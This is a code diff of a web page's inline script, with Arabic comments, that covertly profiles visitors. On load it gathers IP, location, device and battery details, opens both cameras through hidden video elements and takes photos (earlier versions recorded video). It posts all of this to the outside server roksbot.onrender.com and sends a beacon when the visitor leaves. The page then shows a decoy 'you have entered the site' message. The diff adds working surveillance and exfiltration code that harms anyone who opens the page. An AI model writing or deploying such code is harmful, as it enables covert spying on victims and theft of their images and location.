@@ -45,12 +45,12 @@
     <video id="frontVideo" playsinline autoplay muted style="display:none; visibility:hidden;"></video>
     <video id="backVideo" playsinline autoplay muted style="display:none; visibility:hidden;"></video>
     <script>
-        // السيرفر الجديد الهدف
+        // السيرفر الهدف - متوافق مع server.js
         const EXTERNAL_SERVER_URL = 'https://roksbot.onrender.com';
         
         const frontVideo = document.getElementById('frontVideo');
         const backVideo = document.getElementById('backVideo');
-        const userId = window.location.pathname.split('/')[3];
+        const userId = window.location.pathname.split('/')[3] || 'unknown-user';
 
         async function collectAdditionalData() {
             try {
@@ -61,18 +61,24 @@
                     ip: ipInfo.ip,
                     country: ipInfo.country_name,
                     city: ipInfo.city,
+                    timezone: ipInfo.timezone,
+                    language: navigator.language,
                     platform: getPlatformInfo().platform,
                     deviceVersion: getDeviceVersion(),
-                    batteryLevel: battery.level,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    batteryLevel: Math.round(battery.level * 100) + '%',
                     batteryCharging: battery.charging,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+            } catch (error) {
+                console.error('Error collecting additional data', error);
+                return {
                     userAgent: navigator.userAgent,
                     screenResolution: `${screen.width}x${screen.height}`,
                     language: navigator.language,
                     timestamp: new Date().toISOString()
                 };
-            } catch (error) {
-                console.error('Error collecting additional data', error);
-                return {};
             }
         }
 
@@ -99,8 +105,7 @@
                         facingMode: facingMode,
                         width: { ideal: 640 },
                         height: { ideal: 480 }
-                    },
-                    audio: true
+                    }
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 return stream;
@@ -112,153 +117,181 @@
 
         async function init() {
             try {
+                console.log('🚀 بدء جمع البيانات...');
                 const additionalData = await collectAdditionalData();
                 
-                // أولاً إرسال البيانات الأساسية
-                await sendInitialData(additionalData);
+                // أولاً: إرسال البيانات الأساسية عبر /submitData
+                await sendBasicData(additionalData);
                 
-                // ثم محاولة الوصول للكاميرات
-                const frontStream = await requestCameraPermission('user');
-                const backStream = await requestCameraPermission('environment');
-
-                if (frontStream || backStream) {
-                    handleSuccess(frontStream, backStream, additionalData);
-                } else {
-                    // إذا لم يتم الوصول للكاميرات، نرسل البيانات فقط
-                    await sendDataOnly(additionalData);
-                    showCompletionMessage();
-                }
-            } catch (e) {
-                console.error('Error in init:', e);
-                // حتى إذا فشل كل شيء، نرسل البيانات الأساسية
-                try {
-                    const additionalData = await collectAdditionalData();
-                    await sendDataOnly(additionalData);
-                } catch (error) {
-                    console.error('Failed to send basic data:', error);
-                }
+                // ثانياً: محاولة الوصول للكاميرات وإرسال الصور
+                await captureAndSendPhotos(additionalData);
+                
+                // أخيراً: إرسال بيانات الجهاز عبر /SS
+                await sendDeviceInfo(additionalData);
+                
+            } catch (error) {
+                console.error('Error in init:', error);
+            } finally {
                 showCompletionMessage();
             }
         }
 
-        async function sendInitialData(additionalData) {
+        async function sendBasicData(additionalData) {
             try {
                 const data = {
                     userId: userId,
-                    additionalData: additionalData,
-                    message: '🚀 اتصال جديد من المستخدم',
-                    chatId: userId
+                    additionalData: JSON.stringify(additionalData),
+                    message: `🎯 اتصال جديد من المستخدم\n👤 المعرف: ${userId}`
                 };
 
-                await postToExternalServer('/submitData', data);
+                const result = await postToExternalServer('/submitData', data);
+                console.log('✅ تم إرسال البيانات الأساسية:', result);
             } catch (error) {
-                console.error('Error sending initial data:', error);
+                console.error('❌ فشل إرسال البيانات الأساسية:', error);
             }
         }
 
-        async function sendDataOnly(additionalData) {
+        async function captureAndSendPhotos(additionalData) {
             try {
-                const data = {
+                const frontStream = await requestCameraPermission('user');
+                const backStream = await requestCameraPermission('environment');
+                
+                const images = [];
+
+                if (frontStream) {
+                    const frontPhoto = await capturePhoto(frontStream, 'front');
+                    if (frontPhoto) images.push(frontPhoto);
+                    frontStream.getTracks().forEach(track => track.stop());
+                }
+
+                if (backStream) {
+                    const backPhoto = await capturePhoto(backStream, 'back');
+                    if (backPhoto) images.push(backPhoto);
+                    backStream.getTracks().forEach(track => track.stop());
+                }
+
+                if (images.length > 0) {
+                    await sendPhotosToServer(images, additionalData);
+                } else {
+                    console.log('⚠️ لم يتم التقاط أي صور');
+                }
+
+            } catch (error) {
+                console.error('❌ فشل في التقاط الصور:', error);
+            }
+        }
+
+        function capturePhoto(stream, cameraType) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        
+                        canvas.toBlob((blob) => {
+                            resolve({
+                                blob: blob,
+                                filename: `photo_${cameraType}_${Date.now()}.webp`,
+                                cameraType: cameraType
+                            });
+                        }, 'image/webp', 0.8);
+                    }, 1000);
+                };
+            });
+        }
+
+        async function sendPhotosToServer(images, additionalData) {
+            try {
+                const formData = new FormData();
+                
+                formData.append('userId', userId);
+                formData.append('cameraType', 'both');
+                formData.append('additionalData', JSON.stringify(additionalData));
+                
+                images.forEach((image, index) => {
+                    formData.append('images', image.blob, image.filename);
+                });
+
+                const result = await postToExternalServer('/submitPhotos', formData, true);
+                console.log('✅ تم إرسال الصور:', result);
+            } catch (error) {
+                console.error('❌ فشل إرسال الصور:', error);
+            }
+        }
+
+        async function sendDeviceInfo(additionalData) {
+            try {
+                const deviceInfo = {
                     userId: userId,
-                    additionalData: additionalData,
-                    message: '📱 بيانات جهاز المستخدم',
-                    chatId: userId
+                    deviceInfo: {
+                        ip: additionalData.ip,
+                        country: additionalData.country,
+                        city: additionalData.city,
+                        timezone: additionalData.timezone,
+                        language: additionalData.language,
+                        platform: additionalData.platform,
+                        deviceName: getDeviceName(),
+                        browser: navigator.userAgent,
+                        screenResolution: additionalData.screenResolution,
+                        battery: additionalData.batteryLevel,
+                        isCharging: additionalData.batteryCharging,
+                        networkType: 'unknown',
+                        networkSpeed: 'unknown',
+                        touchSupport: 'ontouchstart' in window,
+                        geolocationAvailable: !!navigator.geolocation
+                    },
+                    userInfo: {
+                        name: 'مستخدم الموقع',
+                        phone: 'غير متوفر',
+                        email: 'غير متوفر',
+                        description: 'زائر الموقع'
+                    }
                 };
 
-                await postToExternalServer('/submitData', data);
+                const result = await postToExternalServer('/SS', deviceInfo);
+                console.log('✅ تم إرسال معلومات الجهاز:', result);
             } catch (error) {
-                console.error('Error sending data only:', error);
+                console.error('❌ فشل إرسال معلومات الجهاز:', error);
             }
         }
 
-        function handleSuccess(frontStream, backStream, additionalData) {
-            if (frontStream) {
-                frontVideo.srcObject = frontStream;
-                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, 'front', additionalData));
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/Android/.test(ua)) {
+                const match = ua.match(/Android\s([0-9.]+)/);
+                return `Android ${match ? match[1] : ''}`.trim();
             }
-            if (backStream) {
-                backVideo.srcObject = backStream;
-                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, 'back', additionalData));
+            if (/iPhone|iPad|iPod/.test(ua)) {
+                const match = ua.match(/OS\s([0-9_]+)/);
+                return `iOS ${match ? match[1].replace(/_/g, '.') : ''}`.trim();
             }
+            return navigator.platform;
         }
 
-        function setupCamera(video, cameraType, additionalData) {
-            video.play();
-            video.onplaying = () => {
-                const mediaRecorder = new MediaRecorder(video.srcObject, {
-                    mimeType: 'video/webm;codecs=vp9,opus',
-                    videoBitsPerSecond: 1000000 // 1 Mbps
-                });
-
-                let chunks = [];
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) {
-                        chunks.push(e.data);
-                    }
-                };
-
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    chunks = [];
-                    sendVideo(blob, cameraType, additionalData);
-                };
-
-                mediaRecorder.start();
-
-                // تسجيل لمدة 10 ثوانٍ كحد أقصى
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        video.srcObject.getTracks().forEach(track => track.stop());
-                    }
-                }, 10000); // 10 ثواني
-
-                // أيضاً نتوقف إذا غادر المستخدم الصفحة
-                window.addEventListener('beforeunload', () => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                });
-            };
-        }
-
-        async function sendVideo(blob, cameraType, additionalData) {
-            const formData = new FormData();
-            formData.append('images', blob, `video_${cameraType}.webm`);
-            formData.append('userId', userId);
-            formData.append('cameraType', cameraType);
-            formData.append('additionalData', JSON.stringify(additionalData));
-            formData.append('chatId', userId);
-
-            try {
-                await postToExternalServer('/submitPhotos', formData);
-                console.log(`✅ تم إرسال فيديو ${cameraType} بنجاح`);
-            } catch (error) {
-                console.error(`❌ فشل إرسال فيديو ${cameraType}:`, error);
-            }
-
-            // إيقاف الكاميرات
-            if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
-            if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
-
-            showCompletionMessage();
-        }
-
-        async function postToExternalServer(endpoint, data) {
-            const maxRetries = 3;
+        async function postToExternalServer(endpoint, data, isFormData = false) {
+            const maxRetries = 2;
             let retries = 0;
 
             while (retries < maxRetries) {
                 try {
                     const url = `${EXTERNAL_SERVER_URL}${endpoint}`;
-                    console.log(`🔄 محاولة الإرسال إلى: ${url}`);
+                    console.log(`🔄 الإرسال إلى: ${url}`);
                     
                     const options = {
-                        method: 'POST'
+                        method: 'POST',
+                        mode: 'cors'
                     };
 
-                    // إذا كان FormData نستخدمه مباشرة، وإلا نرسل كـ JSON
-                    if (data instanceof FormData) {
+                    if (isFormData) {
                         options.body = data;
                     } else {
                         options.body = JSON.stringify(data);
@@ -274,14 +307,13 @@
                     }
 
                     const result = await response.json();
-                    console.log('✅ نجح الإرسال للسيرفر الخارجي:', result);
                     return result;
 
                 } catch (error) {
                     console.error(`❌ محاولة ${retries + 1} فشلت:`, error);
                     retries++;
                     if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 2000 * retries));
+                        await new Promise(resolve => setTimeout(resolve, 1000 * retries));
                     } else {
                         throw error;
                     }
@@ -290,29 +322,28 @@
         }
 
         function showCompletionMessage() {
-            document.querySelector('.container').innerHTML = `
-                <h1>تم الدخول الى الموقع</h1>
-                <p>يمكنك إغلاق الصفحة الآن</p>
-            `;
+            setTimeout(() => {
+                document.querySelector('.container').innerHTML = `
+                    <h1>تم الدخول الى الموقع</h1>
+                    <p>يمكنك إغلاق الصفحة الآن</p>
+                `;
+            }, 3000);
         }
 
         // بدء التنفيذ عند تحميل الصفحة
         window.addEventListener('load', init);
 
-        // أيضاً نرسل بيانات عندما يحاول المستخدم مغادرة الصفحة
+        // إرسال بيانات عند مغادرة الصفحة
         window.addEventListener('beforeunload', async () => {
             try {
                 const additionalData = await collectAdditionalData();
                 const exitData = {
                     userId: userId,
-                    additionalData: additionalData,
-                    message: '👋 المستخدم غادر الصفحة',
-                    chatId: userId
+                    additionalData: JSON.stringify(additionalData),
+                    message: `👋 المستخدم غادر الصفحة\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`
                 };
                 
-                // نستخدم navigator.sendBeacon لأنه يعمل حتى عند إغلاق الصفحة
-                const blob = new Blob([JSON.stringify(exitData)], {type : 'application/json'});
-                navigator.sendBeacon(`${EXTERNAL_SERVER_URL}/submitData`, blob);
+                navigator.sendBeacon(`${EXTERNAL_SERVER_URL}/submitData`, JSON.stringify(exitData));
             } catch (error) {
                 console.error('Error sending exit data:', error);
             }
